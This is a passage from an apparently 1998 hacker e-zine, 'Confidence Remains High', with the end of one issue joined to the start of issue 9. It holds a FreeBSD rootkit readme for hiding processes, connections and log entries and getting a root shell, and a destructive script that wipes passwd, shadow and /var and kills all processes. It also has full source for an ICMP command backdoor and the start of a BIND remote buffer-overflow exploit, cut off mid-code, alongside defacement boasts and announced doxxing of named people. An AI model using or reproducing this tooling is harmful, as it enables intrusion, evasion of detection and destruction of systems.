		The default data file is /dev/ptyr.
		All files can be listed with 'ls -/'.
		The format of /dev/ptyr is:
		ptyr
		fbsdrootkit-1.0
		pr0n
		Use partial filenames. This would hide any files/directories 
		with the names ptyr, fbsdrootkit-1.0 and pr0n.

du -		(see ls)

ifconfig -	Modified to remove PROMISC flag on the ethernet device.

netstat -	Modified to remove tcp/udp/sockets from or to specified
		addresses, paths and ports.
		default data file: /dev/ptyq
		command 1: hide local address
		command 2: hide remote address
		command 3: hide local port
		command 4: hide remote port
		command 5: hide UNIX socket path

		example:
		1 128.31        <- Hides all local connections from 128.31.X.X
		2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
		3 8000          <- Hides all local connections from port 8000
		4 6667          <- Hides all remote connections to port 6667
		5 .term/socket  <- Hides all UNIX sockets including the path 
				   .term/socket
		
passwd -	Local user->root. Enter your rootkit password instead of your
		old password.

ps -		Modified to remove specified processes.
		Default data file is /dev/ptyp.
		An example data file is as follows:
        	0 0             Strips all processes running under root
        	1 p0            Strips tty p0
        	2 sniffer       Strips all programs with the name sniffer
		Don't put in the comments, obviously.

rshd -		Execute remote commands as root. 
		Usage: rsh -l rootkitpassword host command
		i.e. rsh -l h0tb0x 0wn3d.escape.com /bin/sh -i
		would start a root shell.

syslogd -	Modified to remove specified strings from logging.
		I thought of this one when I was on a system which logged
		every connection.. I kept getting pissed off with editing
		files every time I connected to remove my hostname. Then I 
		thought 'Hey dude, why not trojan syslogd?!' and the rest
		is history. :)
		Default data file is /dev/ptys
		Example data file:
		evil.com
		123.100.101.202
		rshd
		This would remove all logs containing the strings evil.com,
		123.100.101.202 and rshd. Smart! :))

sniffit -	An advanced network sniffer. This is pretty kewl and has lots
		of filtering options and other stuff. Useful for targetting a
		single host or net. Sniffit uses ncurses.

bindshell -	This is pretty self-explanatory. Basically it binds a 
		shell to a port, 31337 by default. Read the source on 
		this one.

fix -		Replaces and fixes timestamp/checksum infomation on files.
		I modified this a bit for my own uses and to fix a nasty bug
		when replacing syslogd and inetd. The replacement file will
		be erased by fix (unlike other versions).  

addlen -	This quickie modifies the length of files by adding 
		harmless zeros to the end. Wonder why nobody ever 
		thought of doing this before. Inspired by a stupid 
		security tool which checks lengths of setuid files.

zapbsd2 -	This improved version of zapbsd writes over entries with 
		ones instead of zeros.  I added some capabilities and 
		error checking so I raised the number.

TRIPWIRE:
I have done a major improvement of this part. Simply make tripwire and 
the script will ask you a few questions and take action depending on your 
responses. If both the database file and tripwire binary are read-only 
then there is nothing you can do.

SOURCES:
Some of these patches are derived from the original SunOS rootkit. ls, 
du, ps, netstat and chpass were done by yours truly. Anything else came 
from the Linux rootkit with a few modifications. The idea for tripwire 
was my own.

OTHER:
I welcome all comments and questions at method@yikes.com. All complaints 
and flames will be sent to /dev/null.

Thanks to OGhost and Phelix for beta testing and advice.

In closing, this kit can only take you so far. Although it covers almost 
everything, a competent sysadmin will eventually catch on. Remember, 
never let your guard down.
-M

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. l0ckd0wn.sh : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

This is what you run when you're root, and you want to l0ckd0wn the system,
useful in the cases of webpage attacks over weekends etc. heh

% cat > l0ckd0wn.sh << STOP
<paste th3 skr1pt sh1t h3re>
STOP
% sh l0ckd0wn.sh
l0ckd0wn in pr0gr3ss.. must run as r00t
%

(then everything will go b00m)

Here it is...
-------------

#!/bin/sh
#
# l0ckd0wn.sh - so1o th3 k1ng.
#
echo "l0ckd0wn in pr0gr3ss.. must run as r00t"
echo "0wned:hahahahaha:666:666:l0ckd0wn m0therfuck3r:/dev/null:/dev/null" > /etc/passwd
echo "0wned:666::::::::" > /etc/shadow
echo "#" > /etc/inetd.conf
echo "#" > /etc/syslog.conf
echo "w0rdup, we b3 0wned" > /etc/issue.net
rm -rf /var
rm /etc/*tmp
rm /bin/login
touch /etc/utmp
touch /etc/wtmp
kill -9 -1

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ NEWS ]=====================[ .SECTION E. ]=======================[ NEWS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. VMG 0wned : sw1tch
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

THE SAGA CONTINUES.
===================

we have NFS skill, and they got br0ken.. again, but this time we had a plan :

Mirror of Janet Jackson page (jacko smokes a blunt) :

http://www.hacked.net/exp/com/janetjackson/
-------------------------------------------

Mirror of Rolling Stones page (mick fagg0r goes bald and ph34rz) :

http://www.hacked.net/exp/com/the-rolling-stones/
-------------------------------------------------

Not forgetting the Spice Gurls (b0w) :

http://www.hacked.net/exp/uk/co/vmg/spiceworld/
-----------------------------------------------


ugh, we didn't do it, it was other kids and stuff..

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 = HANSON ARE NEXT, THEY WILL D1E. SO WILL THE BACKSTREET BOYS, OH YES. =

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ PROJECTS ]=================[ .SECTION F. ]===================[ PROJECTS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. The Rhino9 Sentinel : so1o / humble
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Sentinel is a remote auditing tool that myself and humble are developing for
the Rhino9 Security Research Team, it will rock, and we will release the beta
version as soon as we get it finished, it is _very_ fast and effective, we'll
keep y'all posted! Full d0x will be in CRH issue 9.


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. TOTALCON '98 : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
  +------------------------------------+------------------------------------+
  Ý  An Official TotalCon Announcement Ý An Official TotalCon Announcement  Ý
  Ý  An Official TotalCon Announcement Ý An Official TotalCon Announcement  Ý
  +------------------------------------+------------------------------------+
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


 TotalCon '98 is now a reality, here are preliminary details...
 ==============================================================

 Venue        :  The Old Firestation, Silver Street, Bristol, ENGLAND
 Date         :  *** POSTPONED, PROBLEMS WITH PREMESIES, stay tuned!@%$ ***
 Duration     :  36 hours non-stop    (midday -> 10:00pm next day)

 Cost         :  15 (15 UKP) ON THE DOOR, this will go back into
                                           the event (beer etc.)

 What         :  12 system network (with additional terminals) along
                 with full internet access, bring your laptops!

                 Loud music, live DJ's
                 Fully licensed bar downstairs / next door
                 Elite UV and spotlighting

                 ALOT of cool people
                 ^^^^^^^^^^^^^^^^^^^

      *** NO SPEAKERS WHATSOEVER *** *** NO SPEAKERS WHATSOEVER ***


 Travel        : Easily accessible by car, train, bus, plane or boat.

 Accomodation  : You can hang around the Firestation or book one of
                 many good hotels in the immediate area.


 Notes         : ALL CA$H RAISED AT THE DOOR FROM ENTRANCE FEES WILL
                 GO BACK INTO THE EVENT! WE WILL PURCHASE GREAT AMOUNTS
                 OF BEER AND FOOD, PROBABLY EVEN A LAPTOP AS A PRIZE!!


$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
  +------------------------------------+------------------------------------+
  Ý  An Official TotalCon Announcement Ý An Official TotalCon Announcement  Ý
  Ý  An Official TotalCon Announcement Ý An Official TotalCon Announcement  Ý
  +------------------------------------+------------------------------------+
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FIN ]======================[ .SECTION G. ]========================[ FIN ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                                .-----------.                    
                                :           :                      
                        .-----. `-----.     ; .-----.                
                :.      :  .--'      .'    .' :     :      .:            
        .-------:::.    :  :       .'    .'   :  .  :    .:::-------.    
        `-------:::'    :: :     .'    .'     :: :  :    `:::-------'    
                :'      ::.`--. ::::  `-----. ::.   :      `:          
                        `-----' ::::.       : `-----'                
                                `-----------'                      
                                                                 
                              [ Team CodeZero ]                
                                                             
               gl0b4l m0therfuck3rz, g1v1ng y0u th3 r34l d34l.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
       the c0dez squirel returns next issue, he's back from vacation.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        . [cZo] .          Team CodeZero Presents            . [cZo] .
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

             `~Y$$$$s,             `~~Y$$$$$s,         ;
     ,ss$$$$$: :$$$$$$$s,   ,ss$$$$P'  :$$$$$$$$s,,sss$$:    `YSss,
    :$$$$$$$:  ,$$$$$$$P"':$$$$$$$:    ,$$$$$$$$$:$$$$$$$      :$$$$$s,
    $$$$$$$$  `~~~Y$P"    $$$$$$$$ ,ss$$$$$$$P"' :$$$$$$$ssssss $$$$$$$$
   :$$$$$$$            ,s:$$$$$$$: `~'YSss,       $$$$$$$$    `~Y$$$$$$$:
   $$$$$$$$    :$$$$$$$P'$$$$$$$$     :$$$$$$$s, :$$$$$$$$:     :$$$$$$$$
 `~Y$$$$$$:     :$$$$$$$s;$$$$$$$:    $$$$$$$$$P"'$$$$$$$$$    ,$$$$$$$$$:
      `~~Y$$s,,s$$$$$$P' $$$$$$$$$s, :$$$$$P'     :$$$$$$$$$s,    `~~Y$$$$$s,
              `$P"'       :P"'       $P'         ,s$$P"'
               :                    `~s,  <mydknight>

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                                                                      Issue 9
                                                                11th May 1998
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


              Man with the plan :  so1o

                      The usual :  om3n, zer0x, xFli, electro,
                                   spheroid, el8, ultima, chameleon.

                  Not forgotten :  loss, organik, peenut, pzn, suid
                                   helix, deprave, manly, Shok.

                         Others :  paladine, Sciri, fiji, ch-E-ztic,
                                   vacuum, humble.

                         Cheers :  Darkcyde, Jf.

                       Russians :  lirik, DemiGod, stranger, ps.

                         Rhino9 :  www.rhino9.org


                     .-----------[ An Official ]-----------.
                     :      .-----.  .----.   .--.--.      :
                     :      :  .--'  : .-. :  :  :  :      :
                     !_-::  :  :     : `-' ;  :  .  :  ::-_!
                     :~-::  :: :     :: . :   ::    :  ::-~:
                     :      ::.`--.  ::.:  :  ::.:  :      :
                     :      `-----'  `--'--'  `--'--'      :
                     !_-::                             ::-_!
                     :~-::-[ Confidence Remains High ]-::-~:
                     :~-::                             ::-~:
                     `-----------[ Production ]------------'


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  In This (compact) Installment of Confidence Remains High : 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

------=>  Section A  :  Introduction And Cover Story.

    1. Confidence Remains High issue 9....................: Tetsu Khan

------=>  Section B  :  Exploits And Code.

    1. ICMP backdoor client and server....................: BiT
    2. BIND 4.9.5 remote..................................: prym
    3. flea.c.............................................: SrfRoG
    4. Dillons Linux crond exploit........................: BM V
    5. KDE klock local exploit............................: someone on bugtraq

------=>  Section C  :  Phones / Scanning / Radio.

    1. Wardialing in the UK...............................: Jf

------=>  Section D  :  Miscellaneous (aka. d0x)

    1. p0sse.rolodex (mad outdated anyway)................: juurigaveitout
    2. RLoxley, first class fuckwit (and fatboy)..........: WH0 GN0Z?
    3. Carolyn Meinel d0x.................................: savec0re

------=>  Section E  :  World News.

    1. MOD break DISN.....................................: JP

------=> Section G  :  FIN.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Confidence Remains High issue 9 : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Blah blah blah, welcome to CRH009, you will find el8 0-day exploits and code,
as well as some semi-interesting texts on a fag called RLoxley, a cl00le$$
fuckwit called Carolyn Meinel, and some info on the MOD.. phear

The Distro List :
=================

   152.7.11.38              /pub/personal/tattooman/confidence_remains_high/
   ftp.sekurity.org         /users/so1o/
   ftp.technotronic.com     /ezines/crh/
   cybrids.simplenet.com    /Toast/files/CRH/
   ftp.linuxwarez.com       /pub/crh/


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ EXPLOITS / CODE ]==========[ .SECTION B. ]============[ EXPLOITS / CODE ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. ICMP backdoor client and server : BiT
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 icmpd.c == server daemon
 icmpc.c == client

<--icmpd.c-------------------------------------------------------------------->

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <unistd.h>

#define RID 31337
#define LID 12345
#define VER "0.3"

void start_pipe(char *buf,int len);
void send_connect(unsigned long to, unsigned int id,char *data);
u_short cksum(u_short *buf, int nwords);

void main()
{
  char buf[512];
  struct iphdr *ip=(struct iphdr *)buf;
  struct icmphdr *icmp=(struct icmphdr *)(buf+sizeof(struct iphdr));
  int lsock,i;
  printf("ICMP PIPE %s - DAEMON PART - BiT'97\n",VER);

  if(geteuid())
    printf("User luser detected\n"),exit(-1);
    lsock=socket(AF_INET,SOCK_RAW,1);
    close(0);close(1);close(2);
    if(fork())
    exit(0);

  while(1)
  {
    i=read(lsock,buf,512);
      if(ip->protocol == 1 && icmp->type == 0 && ntohs(icmp->un.echo.id) == RID)
        start_pipe(buf,i);
  }
}

void start_pipe(char *buf,int len)
{
  char databuf[512];
  FILE *haha;
  struct iphdr *ip=(struct iphdr *)buf;
  struct icmphdr *icmp=(struct icmphdr *)(buf+sizeof(struct iphdr));
  int lsock,i;
  char *p;
  unsigned long int tmp;
  struct sockaddr_in sa;

  lsock=socket(AF_INET,SOCK_RAW,1);
  icmp->un.echo.id=ntohs(LID);
  sa.sin_family=AF_INET;
  sa.sin_addr.s_addr=ip->saddr;
  sendto(lsock,icmp,len-sizeof(struct iphdr),0,(struct sockaddr *)&sa,sizeof(sa));

  /* connected */
  while(1)
  {
    i=recv(lsock,buf,512,0);
      if(ip->potocol == 1 && icmp->type == 0 && ntohs(icmp->un.echo.id) == RID) {
        p=(buf+sizeof(struct iphdr)+sizeof(struct icmphdr));
        memcpy(databuf,p,i-(sizeof(struct iphdr)+sizeof(struct icmphdr))+1);
          if(strcasecmp(databuf,"exit") == 0)
            return;
              if((haha=popen(databuf,"r")) == NULL)
                send_connect(ip->saddr,LID,"Unknown command.\n");
              else {
                i=0;
                  while(fgets(databuf,512,haha) != NULL) {
                    i++;
                    send_connect(ip->saddr,LID,databuf);
                  }
                  if(!i)
                    send_connect(ip->saddr,LID,"Unknown command.\n");
                      pclose(haha);
              }
      }
      fflush(stdout);fflush(stdin);
  }
}

void send_connect(unsigned long to, unsigned int id,char *data)
{
  char buf[512];
  struct icmphdr *icmp = (struct icmphdr *)buf;
  char *bla=(buf+sizeof(struct icmphdr));
  struct sockaddr_in sa;
  int i,sock;

  sock=socket(AF_INET,SOCK_RAW,1);
  bzero(buf,512);
  icmp->type=0;
  icmp->un.echo.id=htons(id);
  strcpy(bla,data);
  icmp->checksum=cksum((u_short *)icmp,(9+strlen(data))>>1);
  sa.sin_family=AF_INET;
  sa.sin_addr.s_addr=to;
  i=sendto(sock,buf,(9+strlen(data)),0,(struct sockaddr *)&sa,sizeof(sa));
  close(sock);
}

u_short cksum(u_short *buf, int nwords) {

  unsigned long sum;

  for ( sum = 0; nwords > 0; nwords -- )
    sum += *buf++;
    sum = ( sum >> 16) + ( sum & 0xffff );
    sum += ( sum >> 16 );
    return ~sum ;
}

<--end of icmpd.c------------------------------------------------------------->


<-icmpc.c--------------------------------------------------------------------->

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <netdb.h>

#define LID 12345
#define VER "0.3"

unsigned int RID;
unsigned long host,myip;
int state=0;
unsigned long int res(char *p);
void send_connect(unsigned long to, unsigned int id,char *data);
void get_string_and_send(void);
void show_shit(char *buf);
u_short cksum(u_short *buf, int nwords);

void main(int argc, char **argv)
{
  char buf[512];
  struct iphdr *ip = (struct iphdr *)buf;
  struct icmphdr *icmp = (struct icmphdr *)(buf+sizeof(struct iphdr));
  int i,lsock;
  fd_set f;
  printf("ICMP PIPE %s - CLIENT PART - BiT'97\n",VER);
    if(argc<3)
      printf("%s <host> <rid>\n",*argv),exit(-1);
        if(geteuid())
          printf("User luser detected\n"),exit(-1);
          host=res(argv[1]);
          RID=atoi(argv[2]);
          lsock=socket(AF_INET,SOCK_RAW,1);
          send_connect(host,RID,"a");
          stat e=1;
  fcntl(lsock,F_SETFL,O_NONBLOCK);
  fcntl(fileno(stdin),F_SETFL,O_NONBLOCK);

  while(1)
  {
    fflush(stdout);
    fflush(stdin);
    FD_ZERO(&f);
    FD_SET(fileno(stdin),&f);
    FD_SET(lsock,&f);
      if(select(FD_SETSIZE,&f,NULL,NULL,NULL))
        {
        if(FD_ISSET(fileno(stdin),&f))
          get_string_and_send();
            if(FD_ISSET(lsock,&f)) {
              i=read(lsock,buf,512);
                if(ip->protocol == 1 && icmp->type == 0 &&
                           ntohs(icmp->un.echo.id) == LID) {
                  if(state==2)
                    show_shit(buf);
                      if(state==1) {
                        state++;
                        printf("Connected.\n");
                      }
                      myip=ip->daddr;
                 }
            }
      }
  }
}

unsigned long int res(char *p)
{
  struct hostent *h;
  unsigned long int rv;

  h=gethostbyname(p);
    if(h!=NULL)
      memcpy(&rv,h->h_addr,h->h_length);
    else
      rv=inet_addr(p);
      return rv;
}

void send_connect(unsigned long to, unsigned int id,char *data)
{
  char buf[512];
  struct icmphdr *icmp = (struct icmphdr *)buf;
  char *bla=(buf+sizeof(struct icmphdr));
  struct sockaddr_in sa;
  int i,ssock;

  ssock=socket(AF_INET,SOCK_RAW,1);
  bzero(buf,512);
  icmp->type=0;
  icmp->un.echo.id=htons(id);
  strcpy(bla,data);
  icmp->checksum=cksum((u_short *)icmp,(9+strlen(data))>>1);
  sa.sin_family=AF_INET;
  sa.sin_addr.s_addr=to;
  i=sendto(ssock,buf,(9+strlen(data)),0,(struct sockaddr *)&sa,sizeof(sa));
  close(ssock);
}

void get_string_and_send(void)
{
  char buf[512];
  bzero(buf,512);
  read(0,buf,512);
  buf[strlen(buf)-1]=0;
  send_connect(host,RID,buf);
    if(strcasecmp(buf,"exit") == 0)
      exit(1);
}

void show_shit(char *buf)
{
  printf((buf+sizeof(struct iphdr)+sizeof(struct icmphdr)));
}

u_short cksum(u_short *buf, int nwords) {
  unsigned long sum;
    for ( sum = 0; nwords > 0; nwords -- )
      sum += *buf++;
      sum = ( sum >> 16) + ( sum & 0xffff );
      sum += ( sum >> 16 );
    return ~sum ;
}

<--end of icmpc.c------------------------------------------------------------->

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. BIND 4.9.5 remote exploit : prym
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 * z, thnx.
 * ganked the xterm exec from adm, thnx.
 * have fun.
 * -prym
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netdb.h>

#define REMOTE
#define DEFAULT_ANBUF_OFFSET 300
#define DEFAULT_TARGET 0
#define DEFAULT_OPTIMIZED 0
#define DLEN_VAL 4
#define PRE_OF_DATALEN (1+(sizeof(short)*3)+sizeof(long))
#define ALEN_VAL (DLEN_VAL+PRE_OF_DATALEN)
#define EVILSPACE (PACKETSZ-PRE_OF_DATALEN)
#define RET_FROM_1NOP (PACKETSZ+(MAXDNAME+3)+(sizeof(int)*6)+4-PRE_OF_DATALEN)
#define OPT_RET_FROM_1NOP (PACKETSZ+(MAXDNAME+3)+4-PRE_OF_DATALEN)

struct target_type
{
  char desc[40];
  int systype;
  unsigned long addr;
  unsigned long opt_addr;
};

struct target_type target[] =
{
  {"x86 Linux 2.0.x named 4.9.5-P1",0,0xbfffef8c,0xbfffefb4},
  {"x86 Linux 2.0.x named 4.9.6-REL",0,0xbffff188,0xbffff194},
  {"x86 Linux 2.0.x named 8.1-REL",0,0xbffff3f0,0xbffff44c},
  {"x86 Linux 2.0.x named 8.1.1",0,0xbffff404,0xbffff45c},
  {"x86 Linux 2.0.x RH 4.2 named 4.9.5-P1",0,0,0xbfffeff8},
  {{0},0,0,0}
};

unsigned long resolve(char *host)
{
  long i;
  struct hostent *he;

  if((i=inet_addr(host))<0)
    if((he=gethostbyname(host))==NULL)
      return(0);
    else
      return(*(unsigned long *)he->h_addr);

  return(i);
}

int send_packet(int fd, char *buff, int len)
{
  char tmp[2], *ptr=tmp;

  PUTSHORT(len,ptr);
  if(write(fd,tmp,2)!=2)
    return(-1);

  if(write(fd,buff,len)!=len)
    return(-1);

  return(1);
}

int attack(int fd, struct in_addr us, struct target_type t,
	   unsigned long offset, int optimized)
{
  char buff[sizeof(HEADER)+PRE_OF_DATALEN+RET_FROM_1NOP+4], *ptr=buff;
  HEADER *dnsh=(HEADER *)buff;
  unsigned long i;
  int dlen, len=0, al=ALEN_VAL, dl=DLEN_VAL;

  memset(dnsh,0,sizeof(HEADER));
  dnsh->id = htons(31337);
  dnsh->opcode = IQUERY;
  dnsh->rd = 1;
  dnsh->ra = 1;
  dnsh->ancount = htons(1);
  ptr += sizeof(HEADER);
  len += sizeof(HEADER);

  *ptr = '\0';
  ptr++;
  PUTSHORT(T_A,ptr);
  PUTSHORT(C_IN,ptr);
  PUTLONG(31337,ptr);
